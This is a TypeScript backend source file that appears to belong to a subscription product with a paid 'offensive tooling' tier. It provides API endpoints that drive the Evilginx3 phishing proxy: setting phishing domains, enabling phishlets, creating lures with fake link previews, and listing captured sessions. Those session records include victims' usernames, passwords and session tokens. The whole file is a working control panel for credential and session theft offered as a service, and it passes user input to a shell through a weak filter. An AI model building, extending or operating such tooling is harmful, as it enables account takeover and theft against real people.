/**
 * Evilginx Router — Backend tRPC endpoints for managing Evilginx3
 * running locally on the Titan server. Titan-tier exclusive feature.
 *
 * Commands are executed directly on the server via child_process.exec —
 * no external VPS or SSH connection required. Evilginx3 must be installed
 * on the same machine as the Titan backend.
 *
 * Binary resolution order:
 *   1. EVILGINX_BIN env var (e.g. /opt/evilginx/evilginx)
 *   2. /usr/local/bin/evilginx
 *   3. evilginx  (PATH lookup)
 */

import { z } from "zod";
import { router, protectedProcedure } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { getUserPlan, enforceFeature } from "./subscription-gate";
import { getDb } from "./db";
import { userSecrets } from "../drizzle/schema";
import { eq, and } from "drizzle-orm";
import { encrypt, decrypt } from "./fetcher-db";
import { consumeCredits } from "./credit-service";
import { getTitanServerConfig, execSSHCommand as execTitanSSH } from "./titan-server";
import { exec as execCb } from "child_process";
import { promisify } from "util";
import fs from "fs";

const execAsync = promisify(execCb);

// ─── Local Exec Helper ────────────────────────────────────────────

function getEvilginxBin(): string {
  if (process.env.EVILGINX_BIN) return process.env.EVILGINX_BIN;
  if (fs.existsSync("/usr/local/bin/evilginx")) return "/usr/local/bin/evilginx";
  return "evilginx";
}

/**
 * Run an Evilginx CLI command locally on the Titan server.
 * Evilginx3 is invoked in -developer mode so it doesn't need root
 * and won't try to bind ports on startup.
 */
async function execEvilginxCommand(
  command: string,
  timeoutMs = 10000
): Promise<string> {
  const bin = getEvilginxBin();
  // Sanitise the command — strip shell metacharacters to prevent injection
  const safeCmd = command.replace(/[`$\\|;&><]/g, "");
  // Pipe the command into evilginx interactive mode
  const shell = `echo '${safeCmd.replace(/'/g, "'\\''")}' | ${bin} -developer 2>&1`;
  try {
    const { stdout, stderr } = await execAsync(shell, { timeout: timeoutMs });
    return (stdout + (stderr ? "\n" + stderr : "")).trim();
  } catch (err: any) {
    // exec rejects on non-zero exit; still return any output collected
    const out = (err.stdout || "") + (err.stderr || "");
    if (out.trim()) return out.trim();
    throw new Error(err.message || "Evilginx command failed");
  }
}

/** Check that the evilginx binary is present and executable */
async function checkEvilginxInstalled(): Promise<{ installed: boolean; version: string; path: string }> {
  const bin = getEvilginxBin();
  try {
    const { stdout } = await execAsync(`${bin} -version 2>&1 || ${bin} --version 2>&1`, { timeout: 5000 });
    const version = stdout.trim().split("\n")[0] || "unknown";
    return { installed: true, version, path: bin };
  } catch {
    // Try `which` as a fallback
    try {
      const { stdout } = await execAsync(`which ${bin} 2>/dev/null`, { timeout: 3000 });
      return { installed: !!stdout.trim(), version: "unknown", path: stdout.trim() || bin };
    } catch {
      return { installed: false, version: "", path: bin };
    }
  }
}

// ─── Parse Helpers ────────────────────────────────────────────────

function parsePhishletList(raw: string): Array<{
  name: string;
  hostname: string;
  status: string;
  isEnabled: boolean;
  isHidden: boolean;
}> {
  const lines = raw.split("\n").filter((l) => l.trim());
  const results: any[] = [];
  for (const line of lines) {
    if (line.includes("---") || line.includes("phishlet") || line.startsWith(":")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 2) {
      const name = parts[0]?.trim();
      const hostname = parts[1]?.trim() || "";
      const status = parts[2]?.trim()?.toLowerCase() || "disabled";
      if (name && !name.includes("─")) {
        results.push({
          name,
          hostname,
          status,
          isEnabled: status === "enabled",
          isHidden: status === "hidden",
        });
      }
    }
  }
  return results;
}

function parseLureList(raw: string): Array<{
  id: number;
  phishlet: string;
  hostname: string;
  path: string;
  redirectUrl: string;
  paused: boolean;
}> {
  const lines = raw.split("\n").filter((l) => l.trim());
  const results: any[] = [];
  for (const line of lines) {
    if (line.includes("---") || line.includes("lure") || line.startsWith(":")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 2) {
      const id = parseInt(parts[0]?.trim());
      if (!isNaN(id)) {
        results.push({
          id,
          phishlet: parts[1]?.trim() || "",
          hostname: parts[2]?.trim() || "",
          path: parts[3]?.trim() || "",
          redirectUrl: parts[4]?.trim() || "",
          paused: parts[5]?.trim()?.toLowerCase() === "paused",
        });
      }
    }
  }
  return results;
}

function parseSessionList(raw: string): Array<{
  id: number;
  phishlet: string;
  username: string;
  password: string;
  tokens: boolean;
  remoteAddr: string;
  createTime: string;
}> {
  const lines = raw.split("\n").filter((l) => l.trim());
  const results: any[] = [];
  for (const line of lines) {
    if (line.includes("---") || line.includes("session") || line.startsWith(":")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 3) {
      const id = parseInt(parts[0]?.trim());
      if (!isNaN(id)) {
        results.push({
          id,
          phishlet: parts[1]?.trim() || "",
          username: parts[2]?.trim() || "",
          password: parts[3]?.trim() || "",
          tokens: parts[4]?.trim()?.toLowerCase() === "captured",
          remoteAddr: parts[5]?.trim() || "",
          createTime: parts[6]?.trim() || "",
        });
      }
    }
  }
  return results;
}

// ─── Router ───────────────────────────────────────────────────────

export const evilginxRouter = router({

  /**
   * Check whether Evilginx3 is installed on this server and return
   * the binary path + version. Used by the UI to show connection status.
   */
  checkInstall: protectedProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
    return checkEvilginxInstalled();
  }),

  /**
   * "Connect" to the local server — verifies the binary is present and
   * saves a local-mode marker so the UI knows the server is configured.
   */
  connectLocal: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

    const check = await checkEvilginxInstalled();
    if (!check.installed) {
      return {
        success: false,
        message: `Evilginx binary not found at '${check.path}'. Install Evilginx3 on this server or set the EVILGINX_BIN environment variable.`,
      };
    }

    // Persist a local-mode marker so getConnection returns a result
    const db = await getDb();
    if (db) {
      const marker = encrypt(JSON.stringify({ mode: "local", path: check.path, version: check.version }));
      const existing = await db
        .select()
        .from(userSecrets)
        .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
        .limit(1);
      if (existing.length > 0) {
        await db
          .update(userSecrets)
          .set({ encryptedValue: marker, updatedAt: new Date() })
          .where(eq(userSecrets.id, existing[0].id));
      } else {
        await db.insert(userSecrets).values({
          userId: ctx.user.id,
          secretType: "__evilginx_ssh",
          label: "Evilginx Local Config",
          encryptedValue: marker,
        });
      }
    }

    return { success: true, message: `Connected — Evilginx found at ${check.path} (${check.version})` };
  }),

  /**
   * Get saved connection info (local mode).
   * Returns host="localhost" so the UI badge shows something meaningful.
   */
  getConnection: protectedProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

    const db = await getDb();
    if (!db) return null;

    const result = await db
      .select()
      .from(userSecrets)
      .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")))
      .limit(1);

    if (result.length === 0) return null;

    try {
      const config = JSON.parse(decrypt(result[0].encryptedValue));
      // Support both legacy SSH records and new local-mode records
      if (config.mode === "local") {
        return { host: "localhost (this server)", port: 0, username: "local", hasPassword: false, hasPrivateKey: false, isLocal: true, version: config.version || "" };
      }
      return {
        host: config.host,
        port: config.port,
        username: config.username,
        hasPassword: !!config.password,
        hasPrivateKey: !!config.privateKey,
        isLocal: false,
        version: "",
      };
    } catch {
      return null;
    }
  }),

  /**
   * Disconnect — removes the saved connection marker.
   */
  disconnect: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

    const db = await getDb();
    if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

    await db
      .delete(userSecrets)
      .where(and(eq(userSecrets.userId, ctx.user.id), eq(userSecrets.secretType, "__evilginx_ssh")));

    return { success: true };
  }),

  /**
   * Execute any Evilginx command locally
   */
  exec: protectedProcedure
    .input(z.object({ command: z.string().min(1) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const output = await execEvilginxCommand(input.command);
      await consumeCredits(ctx.user.id, "evilginx_action", `Evilginx: ${input.command.split(" ")[0]}`);
      return { output };
    }),

  // ─── Config ─────────────────────────────────────────────────────

  getConfig: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
    const output = await execEvilginxCommand("config");
    return { output };
  }),

  setConfig: protectedProcedure
    .input(
      z.object({
        domain: z.string().optional(),
        ipv4: z.string().optional(),
        ipv4External: z.string().optional(),
        ipv4Bind: z.string().optional(),
        unauthUrl: z.string().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const commands: string[] = [];
      if (input.domain) commands.push(`config domain ${input.domain}`);
      if (input.ipv4) commands.push(`config ipv4 ${input.ipv4}`);
      if (input.ipv4External) commands.push(`config ipv4 external ${input.ipv4External}`);
      if (input.ipv4Bind) commands.push(`config ipv4 bind ${input.ipv4Bind}`);
      if (input.unauthUrl) commands.push(`config unauth_url ${input.unauthUrl}`);

      const results: string[] = [];
      for (const cmd of commands) {
        results.push(await execEvilginxCommand(cmd));
      }
      return { output: results.join("\n") };
    }),

  // ─── Phishlets ──────────────────────────────────────────────────

  listPhishlets: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
    const output = await execEvilginxCommand("phishlets");
    return { raw: output, phishlets: parsePhishletList(output) };
  }),

  enablePhishlet: protectedProcedure
    .input(z.object({ name: z.string(), hostname: z.string().optional() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const commands: string[] = [];
      if (input.hostname) commands.push(`phishlets hostname ${input.name} ${input.hostname}`);
      commands.push(`phishlets enable ${input.name}`);

      const results: string[] = [];
      for (const cmd of commands) {
        results.push(await execEvilginxCommand(cmd));
      }
      return { output: results.join("\n") };
    }),

  disablePhishlet: protectedProcedure
    .input(z.object({ name: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`phishlets disable ${input.name}`);
      return { output };
    }),

  hidePhishlet: protectedProcedure
    .input(z.object({ name: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`phishlets hide ${input.name}`);
      return { output };
    }),

  setPhishletHostname: protectedProcedure
    .input(z.object({ name: z.string(), hostname: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`phishlets hostname ${input.name} ${input.hostname}`);
      return { output };
    }),

  getPhishletHosts: protectedProcedure
    .input(z.object({ name: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`phishlets get-hosts ${input.name}`);
      return { output };
    }),

  // ─── Lures ──────────────────────────────────────────────────────

  listLures: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
    const output = await execEvilginxCommand("lures");
    return { raw: output, lures: parseLureList(output) };
  }),

  createLure: protectedProcedure
    .input(z.object({ phishlet: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`lures create ${input.phishlet}`);
      return { output };
    }),

  editLure: protectedProcedure
    .input(
      z.object({
        id: z.number(),
        field: z.enum(["hostname", "path", "redirect_url", "redirector", "ua_filter", "og_title", "og_desc", "og_image", "og_url", "info"]),
        value: z.string(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`lures edit ${input.id} ${input.field} ${input.value}`);
      return { output };
    }),

  deleteLure: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`lures delete ${input.id}`);
      return { output };
    }),

  pauseLure: protectedProcedure
    .input(z.object({ id: z.number(), duration: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`lures pause ${input.id} ${input.duration}`);
      return { output };
    }),

  unpauseLure: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`lures unpause ${input.id}`);
      return { output };
    }),

  getLureUrl: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`lures get-url ${input.id}`);
      return { output };
    }),

  // ─── Sessions ───────────────────────────────────────────────────

  listSessions: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
    const output = await execEvilginxCommand("sessions");
    return { raw: output, sessions: parseSessionList(output) };
  }),

  getSession: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`sessions ${input.id}`);
      return { output };
    }),

  deleteSession: protectedProcedure
    .input(z.object({ id: z.union([z.number(), z.literal("all")]) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`sessions delete ${input.id}`);
      return { output };
    }),

  // ─── Proxy ──────────────────────────────────────────────────────

  getProxy: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
    const output = await execEvilginxCommand("proxy");
    return { output };
  }),

  setProxy: protectedProcedure
    .input(
      z.object({
        type: z.enum(["http", "socks5"]).optional(),
        address: z.string().optional(),
        port: z.number().optional(),
        username: z.string().optional(),
        password: z.string().optional(),
        enabled: z.boolean().optional(),
      })
    )
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");

      const commands: string[] = [];
      if (input.type) commands.push(`proxy type ${input.type}`);
      if (input.address) commands.push(`proxy address ${input.address}`);
      if (input.port) commands.push(`proxy port ${input.port}`);
      if (input.username) commands.push(`proxy username ${input.username}`);
      if (input.password) commands.push(`proxy password ${input.password}`);
      if (input.enabled !== undefined) commands.push(`proxy enabled ${input.enabled}`);

      const results: string[] = [];
      for (const cmd of commands) {
        results.push(await execEvilginxCommand(cmd));
      }
      return { output: results.join("\n") };
    }),

  // ─── Blacklist ──────────────────────────────────────────────────

  getBlacklist: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
    const output = await execEvilginxCommand("blacklist");
    return { output };
  }),

  setBlacklist: protectedProcedure
    .input(z.object({ mode: z.enum(["off", "unauth", "all"]) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
      const output = await execEvilginxCommand(`blacklist ${input.mode}`);
      return { output };
    }),
});
